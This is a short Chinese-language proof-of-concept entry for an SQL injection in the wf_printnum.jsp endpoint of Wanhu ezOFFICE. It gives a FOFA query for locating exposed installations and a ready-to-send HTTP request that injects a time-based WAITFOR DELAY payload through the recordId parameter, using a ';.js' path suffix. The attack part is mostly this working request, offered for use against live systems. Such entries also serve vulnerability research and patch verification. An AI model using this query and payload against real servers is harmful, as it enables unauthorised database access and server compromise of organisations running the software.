## 万户 ezOFFICE wf_printnum.jsp SQL注入

>万户ezOFFICE协同管理平台是一个综合信息基础应用平台分为企业版和政务版。解决方案由五大应用、两个支撑平台组成，分别为知识管理、工作流程、沟通交流、辅助办公、集成解决方案及应用支撑平台、基础支撑平台。

## 简介

万户ezOFFICE wf_printnum.jsp接口存在SQL注入漏洞，恶意攻击者可利用此漏洞获取数据库信息，获取服务器控制权限。

## 漏洞类型

SQL注入

## 网络绘测

### fofa

```
app="ezOFFICE协同管理平台"
```

## POC

```http
GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

